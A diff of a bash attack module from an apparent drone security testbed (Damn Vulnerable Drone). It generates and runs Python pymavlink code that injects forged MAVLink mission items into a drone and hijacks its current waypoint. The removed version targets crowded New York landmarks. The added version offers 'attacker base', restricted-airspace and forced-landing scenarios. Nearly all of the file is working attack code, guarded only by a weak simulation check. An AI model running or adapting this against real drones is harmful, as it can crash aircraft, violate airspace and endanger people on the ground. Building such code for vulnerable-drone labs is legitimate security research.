@@ -1,339 +1,575 @@
 #!/bin/bash
+# waypoint_injection.sh - Waypoint Injection Attack Module
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/waypoint_injection.sh
+# Purpose: Inject malicious waypoints into drone mission using forged MISSION_ITEM MAVLink commands
 
-# =============================================================================
-# DVD Waypoint Injection Attack
-# =============================================================================
-# 파일: dvd_lite/dvd_attacks/injection/waypoint_injection.sh
-# 목적: 악의적 경로점 주입으로 드론 항로 조작
-# 기반: Damn Vulnerable Drone Wiki - Waypoint Injection
-# =============================================================================
+source "$(dirname "$0")/../common/colors.sh"
+source "$(dirname "$0")/../common/utils.sh"
 
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh
+ATTACK_NAME="Waypoint Injection"
+TARGET_IP="${TARGET_IP:-127.0.0.1}"
+MAVLINK_PORT="${MAVLINK_PORT:-14550}"
+LOG_FILE="$(get_log_dir)/injection/waypoint_injection_$(date +%Y%m%d_%H%M%S).log"
 
-# 전역 변수
-ATTACK_NAME="waypoint_injection"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
-JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"
+# Default malicious waypoint coordinates (attacker controlled area)
+DEFAULT_LAT="-35.363261"
+DEFAULT_LON="149.165230"
+DEFAULT_ALT="20"
 
-# 타겟 설정
-TARGET_IP="10.13.0.3"
-MAVLINK_PORT="5760"
-
-# 악의적 경로점들 (위험 지역으로 유도)
-declare -a MALICIOUS_WAYPOINTS=(
-    "40.7589,-73.9851,100"    # NYC Times Square
-    "40.7505,-73.9934,150"    # NYC Empire State Building
-    "40.7831,-73.9712,200"    # NYC Central Park
-)
-
-declare -a ATTACK_COMMANDS=()
-declare -a INJECTION_RESULTS=()
-
-print_header() {
-    clear
-    print_injection_header "Waypoint Injection Attack"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Method: MAVLink mission item injection${NC}"
-    echo -e "${INFO_COLOR}Malicious waypoints: ${#MALICIOUS_WAYPOINTS[@]}${NC}"
+print_attack_banner() {
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${CYAN}         Waypoint Injection Attack          ${NC}"
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
+    echo -e "${YELLOW}Purpose: Inject malicious waypoints${NC}"
     echo ""
 }
 
-# Step 1: 현재 미션 확인
-check_current_mission() {
-    echo -e "${BLUE}[1/3] Check Current Mission${NC}"
+check_mavlink_connection() {
+    log_info "Checking MAVLink connection..."
     
-    local check_script="/tmp/mission_check_$(date +%s).py"
+    if ! nc -u -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
+        log_error "MAVLink service not accessible at ${TARGET_IP}:${MAVLINK_PORT}"
+        return 1
+    fi
     
-    cat > "$check_script" << 'EOF'
-#!/usr/bin/env python3
-import sys
-
-try:
-    from pymavlink import mavutil
-    import time
-    
-    def check_mission(target_ip, target_port):
-        try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
-            
-            # 현재 미션 요청
-            master.mav.mission_request_list_send(
-                master.target_system,
-                master.target_component
-            )
-            
-            msg = master.recv_match(type='MISSION_COUNT', blocking=True, timeout=10)
-            if msg:
-                print(f"[+] Current mission has {msg.count} items")
-                return msg.count
-            else:
-                print("[!] No mission response")
-                return 0
-                
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            print("[*] Simulating mission check")
-            print("[+] Current mission has 4 items (simulated)")
-            return 4
-    
-    if __name__ == "__main__":
-        check_mission(sys.argv[1], int(sys.argv[2]))
-        
-except ImportError:
-    print("[*] pymavlink not available")
-    print("[+] Simulated mission: 4 waypoints")
-EOF
-
-    local cmd="python3 $check_script $TARGET_IP $MAVLINK_PORT"
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
-    
-    python3 "$check_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
-        echo -e "${YELLOW}[+] Simulated current mission: 4 waypoints${NC}"
-    }
-    
-    INJECTION_RESULTS+=("original_mission:checked")
-    rm -f "$check_script"
+    log_success "MAVLink port accessible"
+    return 0
 }
 
-# Step 2: 악의적 경로점 주입
-inject_malicious_waypoints() {
-    echo -e "${BLUE}[2/3] Inject Malicious Waypoints${NC}"
+execute_waypoint_injection() {
+    local lat="${1:-$DEFAULT_LAT}"
+    local lon="${2:-$DEFAULT_LON}"
+    local alt="${3:-$DEFAULT_ALT}"
     
-    local inject_script="/tmp/waypoint_inject_$(date +%s).py"
+    log_info "Starting waypoint injection attack..."
+    log_info "Injecting waypoint: lat=$lat, lon=$lon, alt=${alt}m"
     
-    cat > "$inject_script" << EOF
+    create_injection_script "$lat" "$lon" "$alt"
+    local result=$?
+    
+    if [ $result -eq 0 ]; then
+        log_success "Waypoint injection attack completed"
+        return 0
+    else
+        log_error "Waypoint injection attack failed"
+        return 1
+    fi
+}
+
+create_injection_script() {
+    local lat="$1"
+    local lon="$2"
+    local alt="$3"
+    
+    local script_path="/tmp/waypoint_injection_attack.py"
+    
+    cat > "$script_path" << EOF
 #!/usr/bin/env python3
+"""
+Waypoint Injection Attack
+Inject malicious waypoints into drone mission using MISSION_ITEM MAVLink commands
+"""
+
 import sys
 import time
+from pymavlink import mavutil
 
-try:
-    from pymavlink import mavutil
-    
-    def inject_waypoints(target_ip, target_port, waypoints):
+class WaypointInjectionAttack:
+    def __init__(self, target_ip='${TARGET_IP}', target_port=${MAVLINK_PORT}):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.master = None
+        self.original_mission = []
+        
+    def connect(self):
+        """Connect to the drone"""
         try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
+            connection_string = f'udp:{self.target_ip}:{self.target_port}'
+            print(f"[*] Connecting to {connection_string}")
             
-            # 미션 초기화
-            master.mav.mission_clear_all_send(
-                master.target_system,
-                master.target_component
-            )
-            time.sleep(1)
+            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
+            self.master.wait_heartbeat(timeout=10)
             
-            # 미션 아이템 수 알림
-            master.mav.mission_count_send(
-                master.target_system,
-                master.target_component,
-                len(waypoints) + 1  # +1 for takeoff
-            )
-            time.sleep(1)
-            
-            # Takeoff 명령 추가
-            master.mav.mission_item_int_send(
-                master.target_system,
-                master.target_component,
-                0,  # seq
-                0,  # frame
-                22, # MAV_CMD_NAV_TAKEOFF
-                1,  # current
-                1,  # autocontinue
-                0, 0, 0, 0,  # param1-4
-                0, 0,        # x, y (not used for takeoff)
-                50 * 100     # z (altitude in cm)
-            )
-            
-            print("[!] Injected TAKEOFF command")
-            
-            # 악의적 경로점 주입
-            for i, waypoint in enumerate(waypoints):
-                lat, lon, alt = waypoint.split(',')
-                lat_int = int(float(lat) * 1e7)
-                lon_int = int(float(lon) * 1e7)
-                alt_cm = int(float(alt) * 100)
-                
-                master.mav.mission_item_int_send(
-                    master.target_system,
-                    master.target_component,
-                    i + 1,  # seq
-                    0,      # frame
-                    16,     # MAV_CMD_NAV_WAYPOINT
-                    0,      # current
-                    1,      # autocontinue
-                    0, 0, 0, 0,  # param1-4
-                    lat_int,     # x (latitude)
-                    lon_int,     # y (longitude) 
-                    alt_cm       # z (altitude in cm)
-                )
-                
-                print(f"[!] Injected waypoint {i+1}: {lat}, {lon}, {alt}m")
-                time.sleep(0.5)
-            
-            print(f"[+] Successfully injected {len(waypoints)} malicious waypoints")
+            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
+            return True
             
         except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            simulate_waypoint_injection(waypoints)
+            print(f"[-] Connection failed: {e}")
+            return False
     
-    def simulate_waypoint_injection(waypoints):
-        print("[*] Simulating waypoint injection")
-        print("[!] Injected TAKEOFF command")
+    def get_current_mission(self):
+        """Get current mission for reference"""
+        try:
+            print("[*] Requesting current mission...")
+            
+            # Request mission count
+            self.master.mav.mission_request_list_send(
+                self.master.target_system,
+                self.master.target_component
+            )
+            
+            # Wait for mission count
+            msg = self.master.recv_match(type='MISSION_COUNT', blocking=True, timeout=5)
+            if msg:
+                mission_count = msg.count
+                print(f"[+] Current mission has {mission_count} waypoints")
+                
+                # Request each mission item
+                for seq in range(mission_count):
+                    self.master.mav.mission_request_int_send(
+                        self.master.target_system,
+                        self.master.target_component,
+                        seq
+                    )
+                    
+                    item_msg = self.master.recv_match(type='MISSION_ITEM_INT', blocking=True, timeout=3)
+                    if item_msg:
+                        waypoint = {
+                            'seq': item_msg.seq,
+                            'lat': item_msg.x / 1e7,
+                            'lon': item_msg.y / 1e7,
+                            'alt': item_msg.z,
+                            'command': item_msg.command
+                        }
+                        self.original_mission.append(waypoint)
+                        print(f"    WP{seq}: lat={waypoint['lat']:.6f}, lon={waypoint['lon']:.6f}, alt={waypoint['alt']:.1f}m")
+                
+                return True
+            else:
+                print("[!] No mission count response")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Failed to get current mission: {e}")
+            return False
+    
+    def inject_malicious_waypoint(self, lat, lon, alt, seq=0):
+        """Inject a malicious waypoint"""
+        try:
+            print(f"[*] Injecting malicious waypoint...")
+            print(f"    Target: lat={lat}, lon={lon}, alt={alt}m")
+            print(f"    Sequence: {seq}")
+            
+            # Convert coordinates to MAVLink format
+            lat_int = int(float(lat) * 1e7)
+            lon_int = int(float(lon) * 1e7)
+            alt_float = float(alt)
+            
+            # Send MISSION_ITEM command
+            self.master.mav.mission_item_send(
+                target_system=self.master.target_system,
+                target_component=self.master.target_component,
+                seq=seq,
+                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
+                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+                current=0,  # Not current waypoint
+                autocontinue=1,  # Auto continue to next waypoint
+                param1=0,   # Hold time (seconds)
+                param2=0,   # Acceptance radius (meters)
+                param3=0,   # Pass through waypoint
+                param4=0,   # Yaw angle (degrees)
+                x=float(lat),
+                y=float(lon),
+                z=alt_float
+            )
+            
+            print("[+] MISSION_ITEM command sent")
+            time.sleep(1)
+            
+            # Try alternative method with MISSION_ITEM_INT
+            self.master.mav.mission_item_int_send(
+                target_system=self.master.target_system,
+                target_component=self.master.target_component,
+                seq=seq + 100,  # Different sequence to avoid conflicts
+                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
+                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+                current=0,
+                autocontinue=1,
+                param1=0,
+                param2=0,
+                param3=0,
+                param4=0,
+                x=lat_int,  # Latitude in 1E7 format
+                y=lon_int,  # Longitude in 1E7 format
+                z=alt_float,
+                mission_type=mavutil.mavlink.MAV_MISSION_TYPE_MISSION
+            )
+            
+            print("[+] MISSION_ITEM_INT command sent")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Failed to inject waypoint: {e}")
+            return False
+    
+    def inject_multiple_waypoints(self, waypoints):
+        """Inject multiple malicious waypoints"""
+        print(f"[*] Injecting {len(waypoints)} malicious waypoints...")
         
-        for i, waypoint in enumerate(waypoints):
-            lat, lon, alt = waypoint.split(',')
-            print(f"[!] Injected waypoint {i+1}: {lat}, {lon}, {alt}m")
-            time.sleep(0.3)
+        successful_injections = 0
         
-        print(f"[+] Simulated injection of {len(waypoints)} waypoints")
-    
-    if __name__ == "__main__":
-        waypoints = [${MALICIOUS_WAYPOINTS[*]/%/\"}]
-        waypoints = [wp.strip('"') for wp in waypoints]
-        inject_waypoints('$TARGET_IP', $MAVLINK_PORT, waypoints)
+        for i, wp in enumerate(waypoints):
+            print(f"[*] Injecting waypoint {i+1}/{len(waypoints)}")
+            
+            if self.inject_malicious_waypoint(wp['lat'], wp['lon'], wp['alt'], wp['seq']):
+                successful_injections += 1
+                print(f"[+] Waypoint {i+1} injected successfully")
+            else:
+                print(f"[-] Failed to inject waypoint {i+1}")
+            
+            time.sleep(1)  # Rate limiting
         
-except ImportError:
-    waypoints = [${MALICIOUS_WAYPOINTS[*]/%/\"}]
-    waypoints = [wp.strip('"') for wp in waypoints]
+        print(f"[RESULT] Successfully injected {successful_injections}/{len(waypoints)} waypoints")
+        return successful_injections > 0
     
-    print("[*] pymavlink not available - simulation mode")
-    print("[!] Injected TAKEOFF command")
+    def hijack_current_waypoint(self, lat, lon, alt):
+        """Hijack the current active waypoint"""
+        try:
+            print("[*] Attempting to hijack current waypoint...")
+            
+            # Set as current waypoint (current=1)
+            self.master.mav.mission_item_send(
+                target_system=self.master.target_system,
+                target_component=self.master.target_component,
+                seq=0,
+                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
+                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+                current=1,  # Set as current waypoint
+                autocontinue=1,
+                param1=0,
+                param2=0,
+                param3=0,
+                param4=0,
+                x=float(lat),
+                y=float(lon),
+                z=float(alt)
+            )
+            
+            print("[+] Current waypoint hijacked!")
+            print(f"[!] Drone should now navigate to: {lat}, {lon}, {alt}m")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Waypoint hijack failed: {e}")
+            return False
     
-    for i, waypoint in enumerate(waypoints):
-        lat, lon, alt = waypoint.split(',')
-        print(f"[!] Injected waypoint {i+1}: {lat}, {lon}, {alt}m")
+    def monitor_mission_progress(self, duration=30):
+        """Monitor mission progress to verify injection"""
+        print(f"[*] Monitoring mission progress for {duration} seconds...")
+        
+        start_time = time.time()
+        last_waypoint = -1
+        
+        while time.time() - start_time < duration:
+            try:
+                msg = self.master.recv_match(
+                    type=['MISSION_CURRENT', 'POSITION_TARGET_GLOBAL_INT', 'GLOBAL_POSITION_INT'],
+                    blocking=False,
+                    timeout=1
+                )
+                
+                if msg:
+                    msg_type = msg.get_type()
+                    
+                    if msg_type == 'MISSION_CURRENT':
+                        if msg.seq != last_waypoint:
+                            print(f"[INFO] Current waypoint: {msg.seq}")
+                            last_waypoint = msg.seq
+                    
+                    elif msg_type == 'GLOBAL_POSITION_INT':
+                        lat = msg.lat / 1e7
+                        lon = msg.lon / 1e7
+                        alt = msg.relative_alt / 1000
+                        print(f"[POS] Current: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m")
+                    
+                    elif msg_type == 'POSITION_TARGET_GLOBAL_INT':
+                        target_lat = msg.lat_int / 1e7
+                        target_lon = msg.lon_int / 1e7
+                        target_alt = msg.alt
+                        print(f"[TARGET] Heading to: lat={target_lat:.6f}, lon={target_lon:.6f}, alt={target_alt:.1f}m")
+                
+            except Exception:
+                continue
+        
+        print("[+] Mission monitoring completed")
+        return True
+
+def main():
+    # Attack parameters
+    target_lat = '${lat}'
+    target_lon = '${lon}'
+    target_alt = '${alt}'
     
-    print(f"[+] Simulated injection completed")
+    print("=" * 60)
+    print("         Waypoint Injection Attack")
+    print("=" * 60)
+    print(f"Target coordinates: {target_lat}, {target_lon}, {target_alt}m")
+    print("WARNING: This attack modifies drone mission!")
+    print()
+    
+    # Initialize attack
+    attack = WaypointInjectionAttack()
+    
+    # Connect to drone
+    if not attack.connect():
+        print("[-] Attack failed: Cannot connect to drone")
+        return 1
+    
+    # Get current mission for reference
+    attack.get_current_mission()
+    
+    # Method 1: Single waypoint injection
+    print("\n[ATTACK 1] Single waypoint injection")
+    if attack.inject_malicious_waypoint(target_lat, target_lon, target_alt, 999):
+        print("[+] Single waypoint injection successful!")
+    else:
+        print("[-] Single waypoint injection failed")
+    
+    time.sleep(2)
+    
+    # Method 2: Multiple waypoint injection
+    print("\n[ATTACK 2] Multiple waypoint injection")
+    malicious_waypoints = [
+        {'seq': 1000, 'lat': target_lat, 'lon': target_lon, 'alt': target_alt},
+        {'seq': 1001, 'lat': str(float(target_lat) + 0.001), 'lon': target_lon, 'alt': str(float(target_alt) + 5)},
+        {'seq': 1002, 'lat': target_lat, 'lon': str(float(target_lon) + 0.001), 'alt': str(float(target_alt) + 10)}
+    ]
+    
+    if attack.inject_multiple_waypoints(malicious_waypoints):
+        print("[+] Multiple waypoint injection successful!")
+    else:
+        print("[-] Multiple waypoint injection failed")
+    
+    time.sleep(2)
+    
+    # Method 3: Current waypoint hijacking
+    print("\n[ATTACK 3] Current waypoint hijacking")
+    if attack.hijack_current_waypoint(target_lat, target_lon, target_alt):
+        print("[+] Current waypoint hijacking successful!")
+        print("[!] *** MISSION COMPROMISED ***")
+        print("[!] Drone navigation redirected to attacker location!")
+    else:
+        print("[-] Current waypoint hijacking failed")
+    
+    # Monitor results
+    print("\n[MONITORING] Mission progress...")
+    attack.monitor_mission_progress(20)
+    
+    return 0
+
+if __name__ == "__main__":
+    try:
+        exit_code = main()
+        sys.exit(exit_code)
+    except KeyboardInterrupt:
+        print("\n[!] Attack interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Attack failed with error: {e}")
+        sys.exit(1)
 EOF
 
-    local cmd="python3 $inject_script"
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
+    chmod +x "$script_path"
     
-    echo -e "${YELLOW}[*] Injecting malicious waypoints...${NC}"
+    log_info "Executing waypoint injection script..."
+    python3 "$script_path" 2>&1 | tee -a "$LOG_FILE"
+    local result=${PIPESTATUS[0]}
     
-    for waypoint in "${MALICIOUS_WAYPOINTS[@]}"; do
-        IFS=',' read -r lat lon alt <<< "$waypoint"
-        echo -e "${GRAY}    Waypoint: $lat, $lon, ${alt}m${NC}"
-    done
+    # Cleanup
+    rm -f "$script_path" 2>/dev/null
     
-    python3 "$inject_script" 2>/dev/null || {
-        echo -e "${YELLOW}[*] Fallback simulation${NC}"
-        echo -e "${RED}[!] Injected TAKEOFF command${NC}"
-        for i in "${!MALICIOUS_WAYPOINTS[@]}"; do
-            IFS=',' read -r lat lon alt <<< "${MALICIOUS_WAYPOINTS[$i]}"
-            echo -e "${RED}[!] Injected waypoint $((i+1)): $lat, $lon, ${alt}m${NC}"
-        done
-    }
-    
-    INJECTION_RESULTS+=("waypoints_injected:${#MALICIOUS_WAYPOINTS[@]}")
-    INJECTION_RESULTS+=("injection_method:mission_item_int")
-    
-    rm -f "$inject_script"
+    return $result
 }
 
-# Step 3: 주입 효과 분석
-analyze_injection_effects() {
-    echo -e "${BLUE}[3/3] Analyze Injection Effects${NC}"
-    
-    echo -e "${CYAN}[*] Analyzing attack effectiveness...${NC}"
-    
-    # 경로점 위험도 분석
-    echo -e "${RED}[!] Injected waypoint analysis:${NC}"
-    for i in "${!MALICIOUS_WAYPOINTS[@]}"; do
-        IFS=',' read -r lat lon alt <<< "${MALICIOUS_WAYPOINTS[$i]}"
-        
-        case "$i" in
-            0)
-                echo -e "${GRAY}    WP$((i+1)): Times Square - HIGH RISK (crowded area)${NC}"
-                ;;
-            1)
-                echo -e "${GRAY}    WP$((i+1)): Empire State Building - CRITICAL RISK (restricted airspace)${NC}"
-                ;;
-            2)
-                echo -e "${GRAY}    WP$((i+1)): Central Park - MEDIUM RISK (public area)${NC}"
-                ;;
-        esac
-    done
-    
-    # 보안 영향 분석
-    echo -e "${RED}[!] Security impact analysis:${NC}"
-    echo -e "${GRAY}    • Original mission compromised${NC}"
-    echo -e "${GRAY}    • Drone diverted to dangerous locations${NC}"
-    echo -e "${GRAY}    • Potential violation of airspace regulations${NC}"
-    echo -e "${GRAY}    • Risk to public safety${NC}"
-    echo -e "${GRAY}    • Mission objectives compromised${NC}"
-    
-    INJECTION_RESULTS+=("security_impact:high")
-    INJECTION_RESULTS+=("airspace_violation:likely")
-    INJECTION_RESULTS+=("mission_compromise:complete")
-    INJECTION_RESULTS+=("public_safety_risk:high")
-}
-
-# JSON 결과 생성
-generate_json_report() {
-    local waypoints_json="["
-    for i in "${!MALICIOUS_WAYPOINTS[@]}"; do
-        IFS=',' read -r lat lon alt <<< "${MALICIOUS_WAYPOINTS[$i]}"
-        waypoints_json+="{\"seq\":$((i+1)),\"lat\":$lat,\"lon\":$lon,\"alt\":$alt}"
-        if [ $i -lt $((${#MALICIOUS_WAYPOINTS[@]} - 1)) ]; then
-            waypoints_json+=","
-        fi
-    done
-    waypoints_json+="]"
-    
-    cat > "$JSON_OUTPUT" << EOF
-{
-  "attack_name": "$ATTACK_NAME",
-  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-  "target": {
-    "ip": "$TARGET_IP",
-    "port": "$MAVLINK_PORT"
-  },
-  "injected_waypoints": $waypoints_json,
-  "waypoint_count": ${#MALICIOUS_WAYPOINTS[@]},
-  "attack_results": ["$(IFS='","'; echo "${INJECTION_RESULTS[*]}")"],
-  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
-  "security_impact": {
-    "mission_compromise": "complete",
-    "airspace_violation": "likely",
-    "public_safety_risk": "high",
-    "regulatory_violation": "probable"
-  }
-}
-EOF
-}
-
-# 메인 실행
-main() {
-    START_TIME=$(date +%s)
-    
-    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
-    echo "=== Waypoint Injection - $(date) ===" > "$LOG_FILE"
-    
-    print_header
-    check_current_mission
-    inject_malicious_waypoints
-    analyze_injection_effects
-    
-    # 결과 요약
+# Interactive mode for waypoint selection
+interactive_mode() {
+    echo -e "${CYAN}=== Interactive Waypoint Injection Configuration ===${NC}"
     echo ""
-    echo -e "${CYAN}=== Attack Summary ===${NC}"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Waypoints Injected: ${#MALICIOUS_WAYPOINTS[@]}${NC}"
-    echo -e "${INFO_COLOR}Security Impact: HIGH${NC}"
     
-    generate_json_report
+    echo -e "${YELLOW}Enter malicious waypoint coordinates:${NC}"
     
-    END_TIME=$(date +%s)
-    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
-    echo -e "${SUCCESS_COLOR}[✓] Waypoint injection completed${NC}"
-    echo -e "${RED}[!] CRITICAL: Mission compromised with dangerous waypoints${NC}"
+    read -p "Latitude [${DEFAULT_LAT}]: " custom_lat
+    custom_lat="${custom_lat:-$DEFAULT_LAT}"
+    
+    read -p "Longitude [${DEFAULT_LON}]: " custom_lon
+    custom_lon="${custom_lon:-$DEFAULT_LON}"
+    
+    read -p "Altitude in meters [${DEFAULT_ALT}]: " custom_alt
+    custom_alt="${custom_alt:-$DEFAULT_ALT}"
+    
+    echo ""
+    echo -e "${GREEN}Injection Configuration:${NC}"
+    echo -e "• Latitude: $custom_lat"
+    echo -e "• Longitude: $custom_lon" 
+    echo -e "• Altitude: ${custom_alt}m"
+    echo ""
+    
+    read -p "Proceed with waypoint injection? (y/N): " confirm
+    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
+        execute_waypoint_injection "$custom_lat" "$custom_lon" "$custom_alt"
+    else
+        log_info "Attack cancelled by user"
+        return 0
+    fi
 }
 
-main "$@"
+# Predefined attack scenarios
+attack_scenarios() {
+    echo -e "${CYAN}=== Predefined Attack Scenarios ===${NC}"
+    echo ""
+    echo "1. Redirect to Attacker Base (Default)"
+    echo "2. Force Emergency Landing"
+    echo "3. Divert to Restricted Airspace"
+    echo "4. Multi-waypoint Hijack"
+    echo "5. Custom coordinates"
+    echo ""
+    
+    read -p "Select attack scenario [1-5]: " choice
+    
+    case $choice in
+        1)
+            log_info "Scenario: Redirect to Attacker Base"
+            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "$DEFAULT_ALT"
+            ;;
+        2)
+            log_info "Scenario: Force Emergency Landing"
+            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "0"
+            ;;
+        3)
+            log_info "Scenario: Divert to Restricted Airspace"
+            # Coordinates near airport or restricted area (example)
+            execute_waypoint_injection "-35.3075" "149.1947" "50"
+            ;;
+        4)
+            log_info "Scenario: Multi-waypoint Hijack"
+            # This will be handled by the Python script
+            execute_waypoint_injection "$DEFAULT_LAT" "$DEFAULT_LON" "$DEFAULT_ALT"
+            ;;
+        5)
+            interactive_mode
+            ;;
+        *)
+            log_error "Invalid selection"
+            return 1
+            ;;
+    esac
+}
+
+show_attack_info() {
+    echo -e "${BLUE}Attack Information:${NC}"
+    echo -e "• ${YELLOW}Attack Type:${NC} Mission Manipulation"
+    echo -e "• ${YELLOW}Method:${NC} MISSION_ITEM MAVLink injection"
+    echo -e "• ${YELLOW}Target:${NC} Drone mission waypoints"
+    echo -e "• ${YELLOW}Impact:${NC} Mission hijacking/diversion"
+    echo -e "• ${YELLOW}Stealth:${NC} High (appears as normal mission)"
+    echo ""
+    echo -e "${RED}WARNING:${NC} This attack can cause drone loss or crash!"
+    echo ""
+}
+
+perform_safety_check() {
+    log_info "Performing safety checks..."
+    
+    # Check for real hardware
+    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
+        log_error "Real hardware detected! This attack is for simulation only."
+        return 1
+    fi
+    
+    # Check for flight controller
+    if lsusb | grep -i "px4\|ardupilot\|3dr"; then
+        log_error "Flight controller hardware detected! Aborting for safety."
+        return 1
+    fi
+    
+    log_success "Safety checks passed - simulation environment confirmed"
+    return 0
+}
+
+main() {
+    print_attack_banner
+    
+    # Safety checks
+    if ! perform_safety_check; then
+        exit 1
+    fi
+    
+    # Root check
+    if ! check_root; then
+        exit 1
+    fi
+    
+    # Tool requirements
+    if ! check_required_tools python3 nc; then
+        log_error "Missing required tools"
+        exit 1
+    fi
+    
+    # Install Python dependencies
+    log_info "Installing Python dependencies..."
+    pip3 install pymavlink >/dev/null 2>&1
+    
+    # Check MAVLink connection
+    if ! check_mavlink_connection; then
+        log_warning "Proceeding without connection verification"
+    fi
+    
+    # Show attack information
+    show_attack_info
+    
+    # Initialize logging
+    mkdir -p "$(dirname "$LOG_FILE")"
+    echo "=== Waypoint Injection Attack Started at $(date) ===" > "$LOG_FILE"
+    
+    # Parse arguments
+    case "${1:-default}" in
+        "interactive"|"-i")
+            interactive_mode
+            ;;
+        "scenarios"|"-s")
+            attack_scenarios
+            ;;
+        "coordinates"|"-c")
+            if [ $# -ge 4 ]; then
+                execute_waypoint_injection "$2" "$3" "$4"
+            else
+                log_error "Usage: $0 coordinates <lat> <lon> <alt>"
+                exit 1
+            fi
+            ;;
+        "default"|"")
+            log_info "Using default attacker coordinates"
+            execute_waypoint_injection
+            ;;
+        "help"|"-h")
+            echo "Usage: $0 [mode] [options]"
+            echo ""
+            echo "Modes:"
+            echo "  default                    Use default coordinates"
+            echo "  interactive, -i            Interactive coordinate selection"
+            echo "  scenarios, -s              Select from predefined scenarios"
+            echo "  coordinates, -c <lat> <lon> <alt>  Use specific coordinates"
+            echo "  help, -h                   Show this help"
+            echo ""
+            echo "Examples:"
+            echo "  $0                         # Default attack"
+            echo "  $0 interactive             # Interactive mode"
+            echo "  $0 scenarios               # Attack scenarios"
+            echo "  $0 coordinates -35.0 149.0 25  # Custom coordinates"
+            exit 0
+            ;;
+        *)
+            log_error "Unknown option: $1"
+            echo "Use '$0 help' for usage information"
+            exit 1
+            ;;
+    esac
+    
+    exit $?
+}
+
+# Execute if called directly
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
